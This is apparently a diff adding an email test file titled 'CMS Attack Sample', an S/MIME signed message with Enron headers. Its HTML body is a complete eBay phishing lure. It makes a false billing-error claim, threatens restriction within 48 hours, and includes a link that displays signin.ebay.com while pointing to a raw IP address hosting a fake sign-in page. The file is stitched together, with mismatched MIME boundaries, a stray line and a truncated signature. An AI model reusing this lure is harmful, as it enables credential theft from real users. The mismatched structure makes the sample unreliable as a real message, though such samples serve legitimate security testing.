@@ -1,0 +1,36 @@
+From: gregory.smith@enron.com
+To: d..steffes@enron.com, leslie.lawner@enron.com, k..allen@enron.com, 
+Subject: CMS Attack Sample
+Content-Type: multipart/signed; protocol="application/x-pkcs7-signature"; micalg="sha-256"; boundary="----5D710E5192338F8D6E1D1324B6443410"
+This is an S/MIME signed message
+----5D710E5192338F8D6E1D1324B6443410
+d
+Content-Type: text/html; charset=iso-8859-1
+Content-Transfer-Encoding: quoted-printable
+
+Dear valued eBay member, <BR><BR>During our regularly scheduled account =
+maintenance and verification procedures, we have detected a slight error in =
+your billing information. <BR><BR>This might be due to either of the =
+following reasons: <BR><BR>1. A recent change in your personal information ( =
+i.e.change of address). <BR>2. Submiting invalid information during the =
+initial sign up process. <BR>3. An inability to accurately verify your =
+selected option of payment due to an internal error within our processors. =
+<BR><BR>Once you have updated your account records your eBay session will not =
+be interrupted and will <BR>continue as normal. <BR><BR>To update your eBay =
+records click on the following link: <BR><A title=3D=
+http://signin.ebay.com/eBayISAPI.dll?SignIn&amp;ssPageName=3Dh:h:sin:US =
+onclick=3D"return ShowLinkWarning()" href=3D=
+"http://86.34.5.170/~xl1/signin.ebay.com.aw-cgi.eBayISAPI.dll/" target=3D=
+_blank onfiltered=3D"return ShowLinkWarning()"><FONT color=3D=
+#003399>http://signin.ebay.com/eBayISAPI.dll?SignIn&amp;ssPageName=3D=
+h:h:sin:US</FONT></A> <BR><BR>If your account information is not updated =
+within 48 hours then your ability to use eBay will become restricted. =
+<BR><BR><BR>Regards, <BR><BR>Safeharbor Department <BR>eBay, Inc.   
+--b803348b-f3c4-4efb-891c-7b41b067ec2d--
+----5D710E5192338F8D6E1D1324B6443410
+Content-Type: application/x-pkcs7-signature; name="smime.p7s"
+Content-Transfer-Encoding: base64 Content-Disposition: attachment; filename="smime.p7s"
+MIIFSgYJKoZIhvcNAQcCoIIFOzCCBTcCAQExDzANBglghkgBZQMEAgEFADALBgkqhkiG9w0BBwGg
+ggUQMIIFDDCCA/SgAwIBAgIMRi8nTsikHAWzzKSCMA0GCSqGSIb3DQEBCwUAMF0xCzAJBgNVBAYT
+AkJFMRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTMwMQYDVQQDEypHbG9iYWxTaWduIFBlcnNv
+----5D710E5192338F8D6E1D1324B6443410
